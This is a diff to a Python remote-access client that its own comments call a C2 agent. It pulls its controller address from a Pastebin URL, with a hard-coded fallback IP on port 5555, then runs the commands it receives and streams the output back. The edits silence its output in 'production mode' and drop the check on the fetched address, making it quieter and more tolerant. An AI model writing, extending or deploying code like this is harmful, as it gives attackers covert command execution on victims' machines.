@@ -13,8 +13,11 @@ import sys
 import time
 import urllib.request
 
+# Import VERBOSE flag from install module (shared verbosity detection)
+from install import VERBOSE
+
 # Configuration
-VERBOSE = False  # Set to False for silent operation (production mode)
+# VERBOSE is now imported from install.py - auto-detects dev vs production mode
 CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"  # Dynamic C2 configuration URL
 FALLBACK_HOST = "52.21.29.104"  # Fallback C2 Server address if Pastebin unreachable
 DEFAULT_PORT = 5555  # Port number
@@ -50,13 +53,13 @@ def get_c2_host():
         with urllib.request.urlopen(CONFIG_URL, timeout=10) as response:
             c2_ip = response.read().decode("utf-8").strip()
 
-            # Basic validation - ensure it looks like an IP address
-            if c2_ip and len(c2_ip) > 6:  # Minimum valid IP like "1.1.1.1"
+            # Use the fetched IP if it has content
+            if c2_ip:
                 C2_HOST = c2_ip
                 log(f"C2 server IP fetched: {C2_HOST}")
                 return C2_HOST
             else:
-                log(f"Invalid C2 IP from Pastebin: '{c2_ip}', using fallback")
+                log(f"Empty C2 address from Pastebin, using fallback")
 
     except Exception as e:
         log(f"Failed to fetch C2 from Pastebin: {e}, using fallback")
@@ -313,7 +316,7 @@ def execute_command_stream(command: str, client_socket, working_dir: str = None)
         # Send error to sender (don't print locally)
         try:
             client_socket.sendall(error_msg.encode("utf-8"))
-        except:
+        except (socket.error, OSError, BrokenPipeError):
             pass  # Socket already closed, nothing we can do
 
         # On error, return the previous working_dir unchanged
@@ -351,7 +354,7 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
                     client_socket.close()
                     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 except socket.gaierror:
-                    print(f"Invalid host address: {host}")
+                    log(f"Invalid host address: {host}")
                     sys.exit(1)
 
             # Reset attempt counter after successful connection
@@ -437,7 +440,7 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
             log("\n\nExiting...")
             sys.exit(0)  # Clean exit on macOS/Linux
     except Exception as e:
-        print(f"Error: {e}")
+        log(f"Error: {e}")
         sys.exit(1)
 
 
